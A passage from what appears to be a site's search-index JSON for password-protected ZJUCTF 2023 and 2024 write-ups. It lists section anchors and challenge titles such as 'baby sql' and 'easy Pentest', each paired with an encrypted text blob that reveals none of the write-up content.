2023"},{"location":"writeups/zjuctf2023/#zjuctf-2023-writeup","text":"f/Jv3SQ+PCRodGy7dfNgUA==;F/OP6jst6wT9H2aDSEgdOiysXOxP9qyDmsGgHpFoCs8++aJmOVCvBYTr4g/Q1SaeHo+x/Ki0SCCHKcqNcfabuIEufagd9P/jCHsEt4HLlpPz1/vKrjzUJMvJL82Ibc85YI+xuSAaLbv1So1N0CsJ28lpUr6ruuRXfF5L9kY1N1lHpjer/bwKRRTcZq2h3VjaAMurdXVAGik4/u20xOH6W9ENyHa8E23Sb7FtYpKLy+BiiTxtHRQwbQLpxR809uEEd87DFhZFOqIHXohbYASibWAuXHeRIE9x16dbbhY4b7E5DRzUwBxUPFMidJrIYuctNVE066BBnUingcfUXkz/rGCAU2SrKKkCW4wzGLz3o5K/4VcwtLTmV4Y3Hy5OPof2/mhEl28t2LnWxfbmDxGxVknRgrYzjA8bEd28vQX+Wif49rMz0z0qmEVL80FfSUDfe+LQo/1gQmmlkldpJTHhU8Jib+OL9VTeboeUzPKWUdLi1kz917C41EVgE9sbIEmVlsZC14G/t7hDSpkdIgF25ITii5pYXaYYwort7haVm9QfwtYIKeYN4QSujsq773OhehcWXuAcRAYPJJqCWytTCjwIclHb122K/boybakGFwDy13jKB19/MSP1fIWzXNEHvnDXwNjHcMd9joONg/xEDrXWWNgcSOGdk5AFwuWtZNv0JqrC0mzowdOjpJfvn+AevyfKzUDLhLqnGDTdjV+kYujKQtMZ68kjQfuiplcGOzuF5bpsgbrI4tVhg8KEkTYBQDY7uEvdY2ecegJLAQKoASRn7zra7XQ1ZKM0jdNH+xV7msm+YuHp12zGyROsfDa8X1t6eDMpBC1yE9Shr7SBybyTTwTrIzOmIalkzwTStzXSuraeb8r+4aRNiBT5q5bbQS/JqCORlmPjTzi41nApSP81qMApQFYgyaqDLtdr9Iga1CGVkB4rm2N1yh58WPgISGwQF3+wZXWNc5Al3NE4dr7AvnGQtfIvmSD7fZ77O7NPns0hMusCOzjJPgPKDbC6QHCedakBklsNVVYtqt1x/6rpqbBZJdslTZw41iTE24gBAFM1UXnWMpz2kk+57kRwFKtzFOsFuWS1RFTEMaBuBwFfAPJjmKs5VdWT/gEv8nVymWnXr1/5UBZmtlqkTzjnfifbR9ZOGQuFrJrsZI9czbmFhwpMSBhNHZpQ9C4YlZ+AMU5F9h2dIc62omUz54PYG0KPZhcjsDVBkxFMdNAvSDVHZ54c8rGzAh/DP3idXP1sLdPb5zyrvlYaPpmW8mmb;^","title":"ZJUCTF 2023 Writeup"},{"location":"writeups/zjuctf2023/#_2","text":"3UCEJLehmgAuuhdL3TtMLg==;Cbng5ZokKL0ZDowQLN16yBcR3hCQqKdYM7RHRDkMJsJS5yRTvJfriTOioYT7sGjnb5urqxdmzEuD8Vt7pyhZFjD2GW2raEeZSjfIO5r8pVxKZLGZUGypqcBIdJgTFAq30NqqAirLpEg0RM4+KlGtWM82BWdATndaFqw/T0yWCR4=;^","title":"\u666e\u901a\u7684\u9b54\u6cd5\u53f2"},{"location":"writeups/zjuctf2023/#23w40a_or_ctf","text":"lEht9IUYJVFTSXwiMw3/Yg==;m0vx6U8GKoknRYEUd6PzD5p8dhia6UsIZm4MOHcaJzwYJc+uC88K/ypj/RfUXVu/8YGa0fF8rvlAuh++yBX7gX8OCa5B/Bui/toBs77CfxeZf2wxwBkwgqryEPMl8ol9YN672DiK/sEFPpsEjlmqO86jw/Gf+pkzpKynja34msCyAzTN7cfOU9b34hyz7D1xkE8S6fUaiZPdXLg3waCirrph7VDfEWZdvGk+5gkDMBW+wKdhOD7LVTE6ahUujJqYKdmAxLwuazlrSvZxwLMaWQflO4/owITlmpha9rOdtV4IxJhtp1+vrZOvLdSWU/yS+hQPljuX6lXxjhJ0l++Xk7IGmAG8mjgEYxDdT8TcR5iUSpx1o2Tt259rIfEe80Pd+9m7uoyfINl9l1NZFjQ8ZpE2ply/PaInUTGJwv2y3c0QBXGDwKq2EvlMi+Dx/dQ6IJXJNULorUkbrbzpBO4u+ql7oo2PYvmoRZP9XhkKfHItXrqFcWqF5v+9mFhfM6V1pJOP3zBWKBYGrWMX60YFRcZEQ2FJfceQXYJWF/USvO4=;^","title":"23w40a_or_ctf"},{"location":"writeups/zjuctf2023/#ruru","text":"d+NmTpkqBJBZTYM6UWqcjQ==;OKxEAPwOciylc2tgeWJ3o6yJKFBREPxKt59idHFvT8HFlFrp19K2kt76h1muyMb0t+lyHAQ09UlT5U30735tY3gYGSLeVp1L7q/EIqfwTVkREvLAzDefQnoFPMIIdLq4ypOVY5CDV+1HRHe2b3a7Ti0N8S9dgDF9CzsBCA5TiGNtwVaqFsy6h6wb4OvF7MZOhMohUgUf94ZWIsMuWaXzJBfyWKCpI65aj0GmEPTGi7HbttWe4dN1ybF2ZvczaQ58Es4V0qcTx1d0c4Ucc3PQrY5QTtpwP7eqfmSDhblZlKO3QUxI9PR9NMr/BT/E1icxpJtpiKOgMdDOT3GVyoCQBvNJY4rM1zeDvvWYK1aQRXPsjWpE6Lx7ALz/ANhFu0CHE1Vx9yBxlmgnHsWGoPzUfTb3Nr/3Kj7jfWUYzO9Fk2U=;^","title":"RURU"},{"location":"writeups/zjuctf2023/#genshin-impact-format","text":"DQeVdaK8ur5OvPKM8B1gqQ==;LeaCbepF45PJVDSWol+totb3H4PXPZOL/yjSWXfajYNspnvkqIc68HivU7ZMob8b9zKDWN9hXbls5RmPUbL4k3LF3zk4JLJNkMGFD6fPIuK/rXsemqIrxKbxdzjkdGdxWOb9cQfDljOzZjasXuZs5Tp5rQ3LQmlJyY9CWY8SEPpMUjzTVKXm0BEJy25GVjYWK6T0tBFi2fD+Zd9TRJ0gzQ==;^","title":"Genshin Impact Format"},{"location":"writeups/zjuctf2023/#proof-of-work","text":"UytE+D4ekirz1kUjdxHxJQ==;eG//WRj1Uh5FwPjaNIkBWDvUq0hAzj2YOswuB3kf0bw=;^","title":"Proof-of-Work"},{"location":"writeups/zjuctf2023/#quine-relay","text":"oDl8FklZl4gIR3UrkB1BTQ==;GOX6/iCb0Zl4yZST4c5jNGkQvvbNou2bV/qj66WLn1eN8eCJEa2EPjJVLy+4lIaKEYgQstjr0bOAsArbSwuyfjv/X1R3vK0huOjqAczC8rMpr7k9WqVUYt27sHlAXUd7;^","title":"Quine Relay"},{"location":"writeups/zjuctf2023/#minesweeper-master","text":"2f3MZTY+78+UoncUFDPuNQ==;tL1m11ArK95OsHyXRiyxvrHOQNg6XXueJvKSc4YguW8=;^","title":"Minesweeper Master"},{"location":"writeups/zjuctf2023/#easy-reverse","text":"kXFZ8Fj4QnePfmQKqGXi7g==;fP6mrUz1xdEZgHBBegSJahqTNjz5/knLl1maegGmAqSbippfttqKs/wPvh60BmqRB++0zwxYVyTTEm5hkuPGMxnQZ89Zgq0ZB6t05R6ED/bGeGW/yZ7EuQ1iQBGziJGEH1dIKbxoN9PnmmN2+D41b1w6zsxqkvWDvwijtaiJvwM=;^","title":"easy reverse"},{"location":"writeups/zjuctf2023/#hash-predictor-1","text":"wIalS57Dn5e80nP39a0Sxg==;o2BtMD2R/q7wsbXeJDXt0scR7K0FSKsvM8T6VgAanXUVYVAasm1nVQrTjn2pGRlo5srszdldXab5dwhrYuhiN0Olo0GqiyQaNOnmg75uJAWOZnu9rXH24m27JGrj4ViYqYkVO9te1dvhc5fKpRmoxcgTkc2LplhwHDMbjwkVCCC5JoSdtpdw2a0S5PgCcha/VYClbrjOmIDVZPJ8H/MrZuBVJtJTFt6xy3fR+K0bBVQfAcDgYm9LXWnsHFHFnDLr;^","title":"hash predictor 1"},{"location":"writeups/zjuctf2023/#hash-predictor-2","text":"sViXLTxJG71H5PAN61qNEg==;5RGCNxmiI3lGs05qRry7umek7hQaed7slkYzswT1MPPmYWtnjChqpN42gFL79oL4XLc6bBy1I7JYXRrrLjp0W4o4lm6DbzpVt5hKdWg+2sMcQs9zoBeF9QtysTf1yte6;^","title":"hash predictor 2"},{"location":"writeups/zjuctf2023/#welcome","text":"fuBEoZmU0iXMQkkGc9gaDw==;mMztrypNkGFZPi/wDeMLFskE7vLeaw1mpsfB/MS96NYNqobHJtMR1GypI38uQiersqkM1bw3p4TUv7C3FLg+XA==;^","title":"welcome"},{"location":"writeups/zjuctf2023/#baby-sql","text":"hSUpquh2ziWcu0d/6n6VHQ==;2VxlIPcXF8pFlaFwQ1U3Y8yNl+JgKswwRmA2RtFlnrgfW0YXTnuq5Ce49vnkDRiT750ncZhc/3ZypZIQKlYsIw==;^","title":"baby sql"},{"location":"writeups/zjuctf2023/#easy-sql","text":"mm+lMTKT3rHp/0+DelgzCQ==;Vz7sxHytckeNoO7QcXVv1ib8LqGlUgJVSC0x3RsrC/n0kdIo1jSctDxEnvbYNXLNqmSdSwkrOQUHdq66USjNc9KCPgKzZ6iqMCy8oKtD0X7FaPbpcPpJrwOdPYUjr9GJ;^","title":"easy sql"},{"location":"writeups/zjuctf2023/#babyphp","text":"QOi10CCkF18gxYVG9Sup6Q==;gT2QMMGQYuguftzq4leYh2ByNuT9Vcs+BnJZqTa07fI=;^","title":"babyphp"},{"location":"writeups/zjuctf2023/#easy-calc","text":"0KE+zz0osM5WCk/oCpDFuw==;EYwc6Zg/IkDt88+unGCVNciJRNFQVhLGboMfQfj7blI1/GveBvnL2rr6EL3R2HkFOM57oyOcIFDmaUzq3cce8TP0eNT4sJggQpIUdhwQY31tG2e5sIpb8OBoali1AbdT;^","title":"easy calc"},{"location":"writeups/zjuctf2023/#babyfor-realjs","text":"pTXJtz8MJBQL5wdZGvGviQ==;8HsvmqCH2qQrrFBlQNuY269Zz2fWEDCgtoctP0ukbec=;^","title":"Baby\uff08for real\uff09js"},{"location":"writeups/zjuctf2023/#rev-signin","text":"WL+DWLHy9IO5cLzKKesKMw==;YcYm5eLlaZsQ7L7WiIemtZoopfYoqkk3hH06ocQBekuyjttzy3V74pBkL0PzoL3q3xarpGY4UYhGq5rfgNgIsmvJjEE5dC/uOyyVXTUlxLEyE/C88w+SwGXFhgRVRlyK;^","title":"rev signin"},{"location":"writeups/zjuctf2023/#zju-dorm","text":"7AaSIUrGfKDZplpTKs7pCA==;rsnL3VfOB++j/2/tDoZtKELv2p+mnc1XhRs3WAbABThRt75I/VJD8sTt50z5iEJDjDClZg8nlYMi4vf+66/YPzZs1TlwvN1t5bzU0pDetQzJn6jiDxowzNfmQGEDy8UG;^","title":"ZJU dorm"},{"location":"writeups/zjuctf2023/#if-else","text":"I2QTh/Pbw1q76I2OhVmUPg==;WWZuAS6A8Eiy8BgpYDCjfF2l8elQrRNtbZpiP4EYsfc6VS5HDnDuI4E3PIX0/ob2xta9BnuQO7I596ByWRpsHcrUbbIin+v59lfVYAHFyZQk20jRbwX9MIk255GMq8zK9XFyePgTQSqc+k2M+r2bcL+RykGpjFfBlr+FMgQd+0E=;^","title":"IF ELSE"},{"location":"writeups/zjuctf2023/#500mazes","text":"x4jkWWJ8IXsi1hDg69wt9Q==;jjMOseDVTxQGBIg4VjYBd1GaiBvT3ur2E3+Ja8CIF2qSyB8NEirbINXJmet/TwU/eFdiNtz5w944YiPEL+SA2W+8KJYRmhtaB2EQ7FRT7hAws+9TP0NzUb4kADccCFmdaB1qlIHQop3wGLIEfdIVLT61jwL6aTOTjJpDogOD+JiPQ8Cy6gUoLZuu7voUMrmz3sEAI/MZT9S/l81Pv+l6lVPqOc7O6gJknT6CLb2CHFr8IGDMMY+gINKZqKdYQ+aj;^","title":"500mazes"},{"location":"writeups/zjuctf2023/#_3","text":"sup1k8PEqmfXvIWtAlF94Q==;DeZMntK8H/zqRbsv5XbhgMsKtIUgXUYoKg79I8lyNqnxRYbFsCsyYrHB8rZIElN6wH/sA/Ol/bkVjOgJXclvBX9g1KQxNjtjc4EIVxb2/8B9UG1/KYkMpQEHBVmpZJJb/JAoKBYRIqn9PEJxjsee1L6NsM5uC9z/th3bCeR/wBm8Co6HKQnkQ9SOxZRj3do8a4BcMRtLBxiY2Woo9At6pg==;^","title":"\u26a1 \u9065 \u9065 \u9886 \u5148 \u26a1"},{"location":"writeups/zjuctf2024/","text":"RiUI8taL64sYQm+wEWTBJw==;;^","title":"\ud83d\udd12 ZJUCTF 2024"},{"location":"writeups/zjuctf2024/#zjuctf-2024-writeup","text":"Ca706p8ZsxoYC8SweiTfRA==;PorlNCobM1hC+K7Dh1qElOKEvffYQ9KUfDq7t6OsfC8goXy58xzX/F35pLP31UwEtbRptfSPLU1XO1erZC2IJry8/bOSYcWufyvvnQJL6a+tvmgbnLATnnC9HuoviDcpT890kEYPr5aC9j8/MCEtgiTCctQCbeeXCn4Y7A2HVGlbY9TexnO6Y+3fBsskIhfjJV2RYh16Y2ngCghYpJqxnWXDFWEassvNWEFvGypb1Pil4Z0DyvPGPuuIUuuxvtSqhAC7rZcugnyuq1RxNTWATTXOd9Q4wOIsx8oQFalIL6RhxPuj/HFxGcXhBzqZXVYjQT0t7vr5gRjmfIPsi8OONb3Q58L+TTDFxfZ3hr0sJrPtVX3Hn35GAtrm4Be2yNuppy4UZkrL1o7BOg/938Qtu+W4PU9jZpaB9dk4MOtVso2usTOt+xXu79WTnh/Sd0GljC9VaKMQFXqIa0xgovgj+vBZExQfiW+y0w80uibrnX44l0bTLuz6LP2Ke6dLnTHivnc9ZLz7pTMChPAqNvUqnFfqipNI7zZGhwbQoBpcvi5C5pn9XOJBeix5CoqCvGlxlPoCIxyDTsoyYQHSQ3EtdA==;^","title":"ZJUCTF 2024 Writeup"},{"location":"writeups/zjuctf2024/#misc","text":"Fb8UPHP7l3Wi2x5jrC4tbw==;WyeZif4g9To5W0UCYLr08m5pD/C0kOCQpUqHTvGW8jE=;^","title":"Misc"},{"location":"writeups/zjuctf2024/#a","text":"vJjo+Rki9sqb7u0mQIgnnQ==;MS1sL+KsKgBhf1yq40Su2Pg3m4kvwCphKM4b+9+MfPxGA6xpJLRJCHZ2Gf+w5w4NAnIJqCphGpL4jf9wChFSqZ/aytsohSuiw/HbYq/fx0jWq2qx1dN2LQVWYYFz05ZBYWOx+r5dU+Cvdkb7L6p4S3FZnA+mRxkO6ooVkBZSKrMN070aQCUU4TG3EC8wwsBEa3FLXyAug8nAnowkAzO5a344bNBYb3wnxWYXYC976jxJ/2mI2ZkPTVEe4nUpKDfUjLMbBwmQqH8MzQCBEE1lburo/DRi2hKgpiRCzuAzKCtraq2mOulwPMWElDjvYjE/W1WH47a3zbS2gfTxHgVBP2N4qihScd5xF+/xMqrygs9Vll38tyThA9Jk9NikhfH7/+Sr17jPqJfVtG1PmmW9FFwNKp847vA2lB49kBlkZyHfBNO0POBCSJ66/F5r+MHLUWzk0w3VTLq6K2DbChEwq9wNL+eDDXlxzM4uk31GXgqcIcFJRG+GuNJdMaDmVD808TSL/d0NLi2M3B4ozfVuuVhmFMFmvPOE0gVHJ/lGPQPjle94N4BXlNNJMppR5zwY8LEqmbDBkKxI1i19BKHDAThnas820kgpxLQI3Xp/sE18aFJRUooOTTREeJ6Fp5xOisiSzTT+4i5RQhSVaoqmU65b+2EEeBpCa2FaYafVw3kwXVS10byvhzlKCMA/1vMwDg8M/0r4IJnNOGZoGJuUWbmq2aoFDEphxUDUmjQAalikAVMci1VuZaDazb9hWiHqGsglFNDdTTv2/CNVCnqTxtJ6/TsZWFQWda3RJq08cDonG+UxUfHHlPESFiEbmSDRdbOQzftUbNVAcVGxUEj7kkSll/gW05A8Ci1IV9nZpYDtD1TrCq3vhFcjcfoPGRibqD3Sn92Uzfr0FTBQqkCXSwQOr5Hp6Nzkn8HVPGIrOvgDmdy8QOIDdHCwqsZrskVaObaIi3+4/nRhs2vvhkkJfCvKFTGrdGiZ4/THuYrBHRz3MZ2JjCI46HoPs8tuxU24mIejXhSjOs5Iu6ox82LZJrz8ebtaPNnkJLkYcaUHlYe4NWdD33nj9tqhZs0fuHtkR/ajENGtKSEpwmY39cPOLg==;^","title":"\u5c0fA\u53e3\u7b97"},{"location":"writeups/zjuctf2024/#silence","text":"tv5b/I5wXv5bOzmaZsR13Q==;flYMrSrxUimlDglvWUI7Z3kWRTIETNiub866Uhn3R7IH3N/9jF4DiJoqGQg+6yhzW70l2LTV132qGHl1o0RmDOAjUVNYQnV3LM3YlNxdOuyE8yvyWzzkjysX2WxGBM9qwpxW0HHp+3ptejMQdYiyUkuK9cx1W9YVhiL1K/Q83iRdhrd668MapgCmqsJrnMd8j5KwYnAyr8Oqq2jUVW7jB3bU9Pyp8mmhEIeqxVlkjDMhMlo5aakBLYbnRobB1FOE;^","title":"Silence"},{"location":"writeups/zjuctf2024/#master-of-c","text":"+NIyBXqv37ALjsqFgIMOYg==;P8ozF+Apl00tKAJTOTjU015VNLtEQROfdbuY48Od61i8t67K8xqMlR63+th5CnP7xqKeRX1pCjmKiUeQNxGYFkMQbgrk+LaljqwB8VvnaBJX+tUa48TF/xf9apL19Cn56lnffJl06ne6F0/zkmrAYuYKSQDFs98Izx6c9B8vkRpqDOHrUQUfXpH8squuv5mVIJdtOxRnpBJN5IY7fOZx8E0LpJRGfoZRHSzzmR67NtBMjyNtTrBBbdT5BF0jWUJ2rsuKw8Xm6fokJOEo8AdEIZpMKUqzJwU37thcnjEpSZpr1P6NDikDp5eEtWXWeC+gvzlm5W0l9Tj+FilbCwm0dX2hmx6QYiPbkvJZSRTkgUGEfaLfG13P9TG1P0M8PDxisygOHXIovLW5afkrNVoSp12HULrrDinY7D/8CUuwqlA=;^","title":"Master of C++"},{"location":"writeups/zjuctf2024/#cba","text":"iAfBC55tWQAzLAmu1bhrdw==;mZFgDZ7d60dJUgg9m53bri9cCYIh58gS+T7hHjPppsIwTTip9pfmk1OPHpIDbn0S0bKXXpEG/vHTGW32wgGbfBOxvfjecnxlRxfrgEJq7s8j1y90QMyrJii8otzBSDFY7YhnrErJVCC4te5HvghMDcUoM80zAyLkSyCLTLiiM/qL76O4Cg7ap5IT9Cv7CaRzOMm4+T59FLaxguKc/Glg+HW1E0jZTUpFW4vW9MzJ+rlLUo8gC5QeTFit2kGvY+uRhaNCxfnRTF7mu+u49iLFUMDfQziIC8ACKnSGf6XF9P4a1NdwgzNZj1cue0QBj/v2oRsw0+qjkgj03RAVNBEwcA==;^","title":"CBA"},{"location":"writeups/zjuctf2024/#_1","text":"A3/2v006FkLDT5fwhoAGeQ==;EDSYtzyVm0S2yE8aGDajQxEZXBmyE2XajIWLTmGezIiR3vTnTJPX2rXxuRk3s5BH1DfmDGC5CDkMAQe/jgFnRz0lA85beJbwX5kPijBXPCD/skLtkJHU8zMI1om4NLqDkC77PjAllOWZKQ16Vzo1PpYFG28qkYOR7hqXN4NX+DUOfEgIqWgO3GYo7l0GeuWsSlJGvlxcUvghpNTSXWJSESMoLigv5dhpNtzSJgEgTRiMPiwfeEtOs4M+3QzLjskOCREKYnbpSh9ZYvf5l54Vmqhx1XHjZ8CJGcUl1dQziUVxOaIOFC+ukE4Qmvpv0K2C9HgreDrW4kSbk6ZSRw6rqpkKKYXxmAdQJNiQ6TsVufwpqdxgZNfGwFrxy4+itlGdwoOXzYAdx+lvOfXGNfHtRlvGt6VLRp70c8yOOVrhrurLSf1MSatscSOqYWgQGTGRZx0kLR6EDhT/GQDIm+KhxTzvkbeVK+j67N/zzVmjaeolUUFSk6FnWiOFeivXmPHBIuZSZyyo3C3KBgCTipWryF+V7C1LZ65Urq6L2DihlCTQKj+wCrrK83ow1FNDiCSypG+0b8CXqhI8XH8eRIqzeA==;^","title":"\u9505\u91cc\u635e\u9762"},{"location":"writeups/zjuctf2024/#bytes","text":"FGDtgkhEqvwA64N1/1r86w==;TkBJl9J0g9uCtd3rHQHRXBMRiCkiwTQ71TZlXaq2k52In7QtUEBtMtK3NJCdfO+lDNYZLFMiSIVaLMbD9Iv846fOMu8MTLde5r5Waf9xYWRr8zeqPqGgpHjqhurATz2RgQCfkF5bS8/vNNIntv43fbay0MnDQN5MRqPyNZyxvAcCcpXEbz8PecHBiYUTCx7kN529wN9uuUj0j5F/9WDzqtWGYTkX/iO/BHmEsZXXzy1nKo0U1rAzt3Mc+gED3j3kmmZYySJ5elcPPCtWXZS834Zf22caB+C0jvXGP7Hiv918JyAlr8Cro33yDI9xxknJNMAgTf2w5UMm2rTjX1Wblg==;^","title":"Bytes?"},{"location":"writeups/zjuctf2024/#minecretf","text":"qYSc18W5Wmj8FSkLXu08tA==;8b20GPK0giSAIjG8y2g08tpxEk6IgO6hVfXMkVPPaYTAZgPyimrk41LATta/Ii86R7UZn9KFaFrQW/8NtuDtr3AXpjvbXMeGX6tefbibFLBprC0b7gkpDdojQFTMjKezrhy6fr0nWlyGtfp0i80o4tCl4k+8R7BY7UBP4XGOL16ZcGFPIbz4biRfLou6bmsTZxjEZTKaps63tZZwofWiWR7oUi/OiGf7fzRlGOfvU1hzQGEMf3eyZkUwN4TdRu9/91xZi1H/hsg3qkzWTWVcZo41d1SbSWeZLjvftiQOcSrOnVlsPRDKycsI41AsND+NB6r7BLMlx9CKWd3QMUvj3Vjx1tsVbieVJeRco0Xby+kVp7adan4cXFr7eD+uc1Q8oLGf/nLUimWuiQLCq6Hx7klz79DFVbuE9JRu+aL1Fa5/euMGMqCO7wOSjEnWfBiKcDrPDa9XafB8ND3RuUK2QQTm//vOAHQ4CQGL9HUUdoKVj76QD36kP0XVqrDYv86Q9mLUPtD+PcD+uaEtsu7e14kecsRqk8RERTg6XAtVYXHu6BH3MlFuIUO7L7x8M7UrOrt7aHXzCXvL21j0GfJ/QnF0VWCfl7X6XtlQ/dV7wEuULGgtJMzyjw9NBM26hGLp1Io+XnAdGYNexsiYlJVWNF7P6Cg4I0aY/ZU1eOpMWfx5JdGDVDxPQ3dJG3znV0r8pZ5f0Wopc/dKEGUd57K6IadeEb1TKO2f1DoAuWmUF17zJ/B9gx2KuxmtYXn28BOvlL20Y44P6/aSNBF4IAs/3Y+nJIplASJ2AwJqvYcqkiTrTpwVQJ1olqiLDDowSti5IpKiMpMu6uOa4n5SBjFu0iNYgioA7J+9hkIY97mWTz/a40Lr2MdVgcq5UfAtlT+uclW4kY2li4kSOuKLAPKVjjwnzV4VjGI2FSKSJThVEZo=;^","title":"Minec(re)tf"},{"location":"writeups/zjuctf2024/#reverse","text":"iWLv4fDRuPt3oOKO/pNOIg==;I/fXkCboHoxx5HlbP8Omo7qIgogFN1sKbrS7mHVmT3I=;^","title":"Reverse"},{"location":"writeups/zjuctf2024/#rev-beginner-1-2-3","text":"/beAeuvh1vWTwKPQ4LvGJA==;4SG7ZKvovMdpj8dGms09o8EbwfuMZePI5T3E/XHuHxjA1xVjfz+zDXUD2IrMOPGcxmkvUlgpovI43TaBDZ+EEL+LothuGdJBjevCSBM6yldYs1ZKpy0yc/kwGHP8GiOk;^","title":"rev beginner 1 2 3"},{"location":"writeups/zjuctf2024/#minecretf-unity-edition","text":"LReNgOCheXOoeNO479K0BA==;67geCU1QhK2r95lo8sgMQSqS7iZiCJljCJCxy+bZRQ4kS/KWjq93WvM0AdcKbOxKjh6vFbn64mhwtllG0E0ExhMfvRU8b72I9G5pEp73eel49VLrolFD4NJ+ghgiHFD6EX8b5D4krnScJ83Awk52IIS/WkgkVnQp9cHuvZJvuqs=;^","title":"Minec(re)tf Unity Edition"},{"location":"writeups/zjuctf2024/#rukma","text":"rEAjPbAB41SIY88rh1Uo/w==;qJ7LaLfWwoTri6MZ2/btOK0ScWhE6XifHwVJ3Sb3NqP9Dc/EQIE8XJjJUTlKHTNxOjirslGYOKfDbvKU6uAaRVy/yysbyOXxG3XTZaKhIyYyUxV054fHCX8mJhcg8OOz78Io+a2iFUF41x/iJPmo7VND7mjVQ+nvuVUb9EfV9JA=;^","title":"Rukma"},{"location":"writeups/zjuctf2024/#easyhap","text":"yW6/yNuP15t7ZoBEervt/A==;GOwszQ7ijuIpMGG1lADXwQvHwfnvwC6Elv009ENQ4bQMboKCHTcTUNSGtUYYm9pkXfJdz0ez7aLiRI+MWdOM+IOprKa8gG7PFEWFPdWIolBUwIqJwxnvz5ENyHH0cPQx2CHXacpdfQtbxPQBzUp1Eu4fxxATPxxgsAvUI/2+94I+j6yJ3JmOErq6Q/SJsq0nNI7+eXxmoz9aUo7EPyZbo7G61pE13AHUZXt9f1DTp49LELHIIcGjM5Bd9d+q6vX0MA2IDgpY/lvp7fvlWOqzqToVZHnqAX/z8RC/C2AciNA7F4KwuV1dsx+NKrmxZ35vpEzwn4fWo4eBy83HWkNJjRZuZ75DHtchC7kp05HLUmW5am7r5+34/YfB1syQt8VbTjTHjvf/nmYi0jXh+eCDmsp0RMemAot8Q2ox0ubifSP/sdDx7M0BVlts3cF3qT+gofmcAfm+k2TMa/KgO0IZJQfullDThFkwqT3oV/GpMZW8hKHuxn+ttm2shG8j9uDchynNEAVVW4Kp3AMEY57naHFflgPQUQTORL4xObxGGMDgKqFMsnR26ruIch1S66sITWP8AcrIz4tOpzA6f5YCIKnEcDZM1ID2B2IztAPJsNbO9OSCyTgvsLJ2on0F+KKf1bKJWreiYs/8e/64tfRtK+pXjwUIzLtbhcRnP3e5pIAEwfCEncTXAXIfAYyLYmujL7TIet0SFN3Nrns2cN0n/ttAPnIB8r8xvbeQg4lo9t5FZnoCCqJZ7n6y3zL7m/HOSdqi+KxCf8x+DrosjpoB4K3W+2mJCSlxpmc56IcnbvHh6ImbnI1Zxv/t9tCllVlKIXTXjDUDRHOaHd+Z/u9PizkGQvSClqO3R2YKzueG1CRbL3zlzjLkTJpdvY5YRXK3ecizdviRHpEr5bodLMp+zS5RurTivqHvKRiaU2f/mGnf439hEC3wwNiSK9xWIlWP7qp1ppPGplaxEJ9IfNn/JLWNu6iR0Y4+HJ9boxJ4x4hVkYYUIQ4qSvBAk8Bc9AE9oEnl/MsOdFYa3RvMaaDvfL8UBHzzhWZPJWlrxmRJclga26YVSeQ9OoyqXftcDsrKsegqPscCrf0WeGBw8Sx0GuUr6un7PZv9CoF2MQ5Rz2fI4iOkw7Yj+Ik9x+TLl3+0;^","title":"easyhap"},{"location":"writeups/zjuctf2024/#web","text":"/U9PQJp7mvbaAzMLwMBJGA==;pguAZ0lvv43ngy7el79RPm94FsEaG6BzNq+NP9t407E=;^","title":"Web"},{"location":"writeups/zjuctf2024/#easy-pentest","text":"IbpccPFCumUCfoiaiDiOFQ==;QbAvBjI/RwWvKcesdp+aFoNITVRIOS4QEqrCZy3hNTusWACbHn2jPF1naTs+J+sZqy6+sAlkSrXvtBnVi+qZt012uVU8Lwe2EOnFRNUwYjJeb3ECvi0bn87mDkDbzJyNq7iO+GBbMzIgZwfzv1jpj1rLISHEVgAe0hHNzMlFYdpceZZByiq7nnZ0J1ILKq1lddKgQrJdN2gDOfJIA5ajMEw/6HS8hSIWZUCRfwlDyx3WRNtwDuUq+JuLTWtZhf+934VelYMf+Dy5ceYCMV5ga6HWnMmUruCDTKjL389uvGr9CcKkDXm2Nvnyw3kZSMnqFUBA1tGArIbJAv9ivFj2qN57LrjFkalEEhBLZHMnvF0vj1hp1rTFVoFFKkCOxAz/wC7zoYhmgWrFO/AzCScaEFBjMwv0ZVyVTKHL13iOJUew8elHAYLXt1doCtGMvUGLaAUbHk077JaWwZHk5dpDIP71BQJVUy1DX2WuKNFHEA1MxDhHfKy/hpBFybJNnl6tALKvFcGtHMXMPbglfbfiJeY2jiQXQBjbaJnpUxUh6TSisJAma5pQiuTqssVSFXuMK0Ir1mkAJe0MKEUDS9RO2hJtPyMiFsI/pZxA75krcODrGTvPxTFmvrhJ9OGemYuLPGKc9wf3NwtacORoCRFaUoKD9axVi1E3X58Do/85V2Zgicr6mZGEAPsGp5ibwbALiA8eaaBQdaMz737ficRLy4hEEfbwcFuMD9gGL0tKhLdemZU2/VUld41ZB3vtXE8L5exaqxLdgvoKQM0jhxWZ2fWo+r9QNhqq064Q1OketqyGBGxEOB8IyPfjFG7muNo5prdx4N9bw0/1LO7QTsJYoBo50SZGFe69IVKK33R88ymgA6tgd/qeb+3qU6ZMSV1A94H0+pXgSERljxaLfHmfPmRAe7rFb3iC+Qbt/DV06iuiZjeK+SNfQTYTT4BdsLQiPI+2WOEyNpnkinM9RdwgRRr2szumc7ReV3bjuYnRorfA37h2ejS+hnt5nE0Rg2NXSnI8Dn3XVxoycv9FMGBelk86yvv7PHfXWe0DWPFy5mY=;^","title":"easy Pentest"},{"location":"writeups/zjuctf2024/#easy-jwt","text":"sSnS8/kZ1OYdbm2R7CcBDg==;6Wh8vnNUQfF7CnrVNAeFC0MZMqAiZGbuB35PjlZ2JrsG7JPD02fDxe1da/BThhgpFT0KjgIf7zC9SFoIeEYr9WqJdbtoVrykuzjg5rNY9V4QMAxkBaKn2Uu2yUUBdhrWZx9F9vF5I6DnYJH6Wc6Wh87I2aWRvTFPt6//ZltwYo+NhVioqp0N/9LXIo4HyuSsTwItEBE0v/yOtvmuDJQxGsEPK0qxObaJhVy+wgzwqcB5gCGwJZKXeYsT6ryIGXvo6+GLIrToSNBx2O4M1dPVX7nIj/8/hFBNn2tMX9I6DGT2ijaamtCGzzVOgGO+7D86yjK9PIkC53OgmextGY5dZ6lO+vQlq4uD/b8ohZttcd/U5CMzQInd4ToRtmfaUwj6XB/8XtbrOAiUDynfqA6c75lTTC2lRifOn2A9gk/S21k+XcBTxcM/3KB88EOuxsPqSjH5Y4fZsx9gxjvZivDzh2Vda3mFErrr29mX5Yw0dtfaOGompoERJEgiGh5J1mDS;^","title":"easy 